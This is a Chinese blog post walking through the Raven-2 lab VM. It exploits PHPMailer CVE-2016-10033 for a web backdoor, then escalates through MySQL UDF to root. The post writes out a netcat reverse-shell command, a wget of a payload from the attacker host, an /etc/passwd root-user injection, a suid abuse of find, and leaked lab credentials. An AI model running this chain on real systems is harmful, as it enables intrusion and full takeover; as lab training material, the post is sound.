@@ -1,0 +1,232 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Raven-2 | 0000FF's Blog</title><meta name="author" content="0000FF"><meta name="copyright" content="0000FF"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1、nmap -sP 10.211.55.0&#x2F;24发现IP：10.211.55.10 2、dirb http:&#x2F;&#x2F;10.211.55.10枚举发现该目录：&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.211.55.10&#x2F;vendor&#x2F; http:&#x2F;&#x2F;10.211.55.10&#x2F;vendor&#x2F;PATH  第二个目录获得flag：&#x2F;var&#x2F;ww">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Raven-2">
+<meta property="og:url" content="https://chr1sto4f.github.io/2023/01/26/Raven-2/index.html">
+<meta property="og:site_name" content="0000FF&#39;s Blog">
+<meta property="og:description" content="1、nmap -sP 10.211.55.0&#x2F;24发现IP：10.211.55.10 2、dirb http:&#x2F;&#x2F;10.211.55.10枚举发现该目录：&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.211.55.10&#x2F;vendor&#x2F; http:&#x2F;&#x2F;10.211.55.10&#x2F;vendor&#x2F;PATH  第二个目录获得flag：&#x2F;var&#x2F;ww">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/20220430025304_38833.jpeg">
+<meta property="article:published_time" content="2023-01-26T09:33:47.000Z">
+<meta property="article:modified_time" content="2023-01-26T09:47:01.087Z">
+<meta property="article:author" content="0000FF">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/20220430025304_38833.jpeg"><link rel="shortcut icon" href="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg"><link rel="canonical" href="https://chr1sto4f.github.io/2023/01/26/Raven-2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Raven-2',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-01-26 17:47:01'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/20220430025304_38833.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">0000FF's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Raven-2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-26T09:33:47.000Z" title="发表于 2023-01-26 17:33:47">2023-01-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-26T09:47:01.087Z" title="更新于 2023-01-26 17:47:01">2023-01-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Raven-2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="1、nmap-sP-10-211-55-0-x2F-24"><a href="#1、nmap-sP-10-211-55-0-x2F-24" class="headerlink" title="1、nmap -sP 10.211.55.0&#x2F;24"></a>1、nmap -sP 10.211.55.0&#x2F;24</h3><p>发现IP：10.211.55.10</p>
+<h3 id="2、dirb-http-10-211-55-10"><a href="#2、dirb-http-10-211-55-10" class="headerlink" title="2、dirb http://10.211.55.10"></a>2、dirb <a target="_blank" rel="noopener" href="http://10.211.55.10/">http://10.211.55.10</a></h3><p>枚举发现该目录：<br>&#x3D;&#x3D;&gt; DIRECTORY: <a target="_blank" rel="noopener" href="http://10.211.55.10/vendor/">http://10.211.55.10/vendor/</a></p>
+<p><a target="_blank" rel="noopener" href="http://10.211.55.10/vendor/PATH">http://10.211.55.10/vendor/PATH</a>  第二个目录获得flag：<br>&#x2F;var&#x2F;www&#x2F;html&#x2F;vendor&#x2F;<br>flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}</p>
+<h3 id="3、http-10-211-55-10-vendor-README-md"><a href="#3、http-10-211-55-10-vendor-README-md" class="headerlink" title="3、http://10.211.55.10/vendor/README.md"></a>3、<a target="_blank" rel="noopener" href="http://10.211.55.10/vendor/README.md">http://10.211.55.10/vendor/README.md</a></h3><p>枚举获得信息：PHPMailer<br><a target="_blank" rel="noopener" href="http://10.211.55.10/vendor/VERSION">http://10.211.55.10/vendor/VERSION</a><br>枚举获得信息：5.2.16<br>这时候去找EXP！</p>
+<h3 id="4、谷歌：PHPMailer-5-2-16-exp"><a href="#4、谷歌：PHPMailer-5-2-16-exp" class="headerlink" title="4、谷歌：PHPMailer 5.2.16 exp"></a>4、谷歌：PHPMailer 5.2.16 exp</h3><p>CVE-2016-10033<br>点击第一条就能发现：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40974">https://www.exploit-db.com/exploits/40974</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 40974</span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/php/webapps/40974.py /root/桌面</span><br></pre></td></tr></table></figure>
+
+<p>将exp考出，需要针对PHPMailer修改参数:<br>41行：改下地址：<a target="_blank" rel="noopener" href="http://10.211.55.10/contact.php">http://10.211.55.10/contact.php</a><br>42行：后门名称：&#x2F;ff.php<br>44行：改下回弹的IP和端口  10.211.55.19  6666<br>47行：改下写入shell的目录：&#x2F;var&#x2F;www&#x2F;html&#x2F;ff.php</p>
+<h3 id="5、执行exp"><a href="#5、执行exp" class="headerlink" title="5、执行exp"></a>5、执行exp</h3><p>python3 40974.py<br>如果环境报错按照环境安装：<br>需要安装requests_toolbelt模块，使用命令：pip install requests-toolbelt安装即可，如果没用pip，需要sudo apt-get install python-pip安装即可。</p>
+<p>访问<a target="_blank" rel="noopener" href="http://10.211.55.10/contact.php%EF%BC%8C%E6%AD%A4%E6%97%B6%E5%B0%B1%E4%BC%9A%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6ff.php">http://10.211.55.10/contact.php，此时就会生成后门文件ff.php</a><br>本地开启监听：nc -vlp 6666<br>访问：<a target="_blank" rel="noopener" href="http://10.211.55.10/ff.php">http://10.211.55.10/ff.php</a><br>获得反弹shell！<br>python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
+<h3 id="6、找寻flag"><a href="#6、找寻flag" class="headerlink" title="6、找寻flag"></a>6、找寻flag</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;11&#x2F;flag3.png<br>&#x2F;var&#x2F;www&#x2F;flag2.txt<br>发现两个flag！读取：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/www/flag2.txt</span><br></pre></td></tr></table></figure>
+
+<p>flag2{6a8ed560f0b5358ecf844108048eb337}</p>
+<p>访问：<br><a target="_blank" rel="noopener" href="http://10.211.55.10/wordpress/wp-content/uploads/2018/11/flag3.png">http://10.211.55.10/wordpress/wp-content/uploads/2018/11/flag3.png</a><br>获得flag3！</p>
+<h3 id="7、wordpress目录枚举"><a href="#7、wordpress目录枚举" class="headerlink" title="7、wordpress目录枚举"></a>7、wordpress目录枚举</h3><p>在flag3目录下发现了wordpress目录，然后进行枚举<br>grep “内容” -rn </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;password&quot;</span> -rn wp-config.php</span><br></pre></td></tr></table></figure>
+
+<p>define(‘DB_USER’, ‘root’);<br>&#x2F;** MySQL database password *&#x2F;<br>define(‘DB_PASSWORD’, ‘R@v3nSecurity’);<br>获得mysql账号密码信息！</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep root   ---查看mysql进程信息</span><br></pre></td></tr></table></figure>
+
+<p>root       917  0.1  0.3 1351196 1760 ?        Sl   Jan07   2:09 &#x2F;usr&#x2F;sbin&#x2F;mysqld –basedir&#x3D;&#x2F;</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep mysql   --查看历史安装包版本</span><br></pre></td></tr></table></figure>
+
+<p>5.5.6</p>
+<p>mysql是root权限运行的，那么接下来就找mysql提权的方法.</p>
+<h3 id="8、mysql-UDF-提权"><a href="#8、mysql-UDF-提权" class="headerlink" title="8、mysql UDF 提权"></a>8、mysql UDF 提权</h3><p>UDF 提权、MOF 提权是非常经典的提权方法！</p>
+<hr>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">-</span>uroot <span class="operator">-</span>pR<span class="variable">@v3nSecurity</span> </span><br><span class="line"><span class="keyword">select</span> version();  <span class="comment">---查看版本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use wordpress</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> wp_users;</span><br><span class="line">michael：$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0</span><br><span class="line">steven：B6X3H3ykawf2oHuPsbjQiih5iJXqad.</span><br></pre></td></tr></table></figure>
+
+<p>首先看一下是否满足写入条件：<br>show global variables like ‘secure%’;<br>+——————+——-+<br>| Variable_name    | Value |<br>+——————+——-+<br>| secure_auth      | Off   |<br>| secure_file_priv |       |<br>+——————+——-+<br>2 rows in set (0.00 sec)<br>1）当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权<br>2）当 secure_file_priv 的值为 &#x2F;tmp&#x2F; ，表示限制 mysqld 的导入|导出只能发生在 &#x2F;tmp&#x2F;目录下，此时也无法提权<br>3）当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权!<br>如果是 MySQL &gt;&#x3D; 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p>
+<p>查看插件目录：<br>show variables like ‘%plugin%’;<br>+—————+————————+<br>| Variable_name | Value                  |<br>+—————+————————+<br>| plugin_dir    | &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; |<br>+—————+————————+<br>1 row in set (0.00 sec)</p>
+<p>查看能否远程登陆：<br>use mysql;<br>select user,host from user;<br>+——————+———–+<br>| user             | host      |<br>+——————+———–+<br>| root             | 127.0.0.1 |<br>| root             | ::1       |<br>| debian-sys-maint | localhost |<br>| root             | localhost |<br>| root             | raven     |<br>+——————+———–+<br>5 rows in set (0.00 sec)<br>发现这里root用户不允许远程登陆，因此不能利用MSF提权。</p>
+<p>谷歌搜索：mysql 5.x UDF exploit  或者  searchsploit udf<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</a>   </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 1518.c</span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/1518.c /root/桌面 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -c 1518.c   ---GCC编译.o文件</span><br><span class="line">gcc -g -shared -o ff.so 1518.o -lc</span><br></pre></td></tr></table></figure>
+
+<p>-g 生成调试信息<br>-c 编译（二进制）<br>-shared：创建一个动态链接库，输入文件可以是源文件、汇编文件或者目标文件。<br>-o：执行命令后的文件名<br>-lc：-l 库 c库名</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.211.55.19:8081/ff.so</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use mysql</span><br><span class="line"><span class="keyword">select</span> database();</span><br></pre></td></tr></table></figure>
+
+<p>进入数据库创建数据表ff：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> ff(line <span class="type">blob</span>);</span><br></pre></td></tr></table></figure>
+
+<p>插入数据文件：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ff <span class="keyword">values</span>(load_file(<span class="string">&#x27;/tmp/ff.so&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>ff表成功插入二进制数据，然后利用dumpfile函数把文件导出，outfile 多行导出，dumpfile一行导出<br>outfile会有特殊的转换，而dumpfile是原数据导出！<br>新建存储函数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ff <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/ff.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>创建自定义函数do_system，类型是integer，别名（soname）文件名字，然后查询函数是否创建成功：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> do_system <span class="keyword">returns</span> <span class="type">integer</span> soname <span class="string">&#x27;ff.so&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>查看以下创建的函数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br></pre></td></tr></table></figure>
+
+<p>调用do_system函数来给find命令所有者的suid权限，使其可以执行root命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> do_system(<span class="string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>执行find命令<br>使用find执行 shell</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> ff</span><br><span class="line">find ff -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br><span class="line">或者：find ff -<span class="built_in">exec</span> <span class="string">&quot;id&quot;</span> \;</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cat</span> flag4.txt</span><br><span class="line">flag4&#123;df2bc5e951d91581467bb9a2a8ff4425&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pR@v3nSecurity </span><br><span class="line">show databases;</span><br><span class="line">use mysql</span><br><span class="line">select database();</span><br><span class="line"></span><br><span class="line">create table ff(line blob);</span><br><span class="line">insert into ff values(load_file(<span class="string">&#x27;/tmp/ff.so&#x27;</span>));</span><br><span class="line">select * from ff into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/ff.so&#x27;</span>;</span><br><span class="line">create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;ff.so&#x27;</span>;</span><br><span class="line">select * from mysql.func;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="select-do-system-‘chmod-u-s-x2F-usr-x2F-bin-x2F-find’"><a href="#select-do-system-‘chmod-u-s-x2F-usr-x2F-bin-x2F-find’" class="headerlink" title="select do_system(‘chmod u+s &#x2F;usr&#x2F;bin&#x2F;find’);"></a>select do_system(‘chmod u+s &#x2F;usr&#x2F;bin&#x2F;find’);</h2><p>拓展知识点：或者利用sys_exec、sys_eval</p>
+<p>select do_system(‘nc -nv 10.211.55.28 6677 -e &#x2F;bin&#x2F;bash’);</p>
+<hr>
+<p>openssl passwd ff<br>YpIR51FecR9AY<br>select do_system(‘echo “ff:xFzxgAbLwwOOA:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash” &gt;&gt; &#x2F;etc&#x2F;passwd’);<br>su ff</p>
+<hr>
+<p>仅限&#x2F;bin&#x2F;bash模式：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">Ctl z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span></span><br><span class="line"><span class="built_in">fg</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cewl http://10.211.55.10/wordpress/ -w user.txt</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Rhynorater/CVE-2018-15473-Exploit.git</span><br><span class="line"><span class="built_in">cd</span> CVE-2018-15473-Exploit/</span><br><span class="line"></span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">proxychains pip3 install --upgrade paramiko==2.4.1</span><br></pre></td></tr></table></figure>
+
+<p>如果可以远程：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql_udf_payload</span><br><span class="line">sqlmap -d <span class="string">&quot;mysql://root:root@192.168.245.130:3306/mysql&quot;</span> --os-shell</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://chr1sto4f.github.io">0000FF</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://chr1sto4f.github.io/2023/01/26/Raven-2/">https://chr1sto4f.github.io/2023/01/26/Raven-2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://chr1sto4f.github.io" target="_blank">0000FF's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><div class="post_share"><div class="social-share" data-image="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/20220430025304_38833.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/26/Tr0ll-1/"><img class="prev-cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/1627789557_462143.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Tr0ll-1</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/26/Lampiao/"><img class="next-cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/c8f5624d123daea9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Lampiao</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/02/04/DerpNStink-1/" title="DerpNStink-1"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-04</div><div class="title">DerpNStink-1</div></div></a></div><div><a href="/2023/01/26/Lampiao/" title="Lampiao"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/c8f5624d123daea9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-26</div><div class="title">Lampiao</div></div></a></div><div><a href="/2023/01/26/GoldenEye/" title="GoldenEye"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.ebb9668b3a30bc070e108ec0341097bd.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-26</div><div class="title">GoldenEye</div></div></a></div><div><a href="/2021/02/05/SQLi%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%A4%87%E5%BF%98%E5%8D%95/" title="SQLi认证绕过常用备忘单"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.a75b2c4dc8eacda7664ec01cb5da76fd.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-05</div><div class="title">SQLi认证绕过常用备忘单</div></div></a></div><div><a href="/2023/01/26/Tr0ll-1/" title="Tr0ll-1"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/1627789557_462143.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-26</div><div class="title">Tr0ll-1</div></div></a></div><div><a href="/2022/02/11/Ubuntu%E4%B8%8B%E9%85%8D%E7%BD%AEmsf%E5%B9%B6%E7%94%9F%E6%88%90%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC/" title="Ubuntu下配置msf并生成安卓木马"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.a4385dd85202d7ff20f912bb5c675214.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-11</div><div class="title">Ubuntu下配置msf并生成安卓木马</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">0000FF</div><div class="author-info__description"></div></div><div class="card-info-data site-data 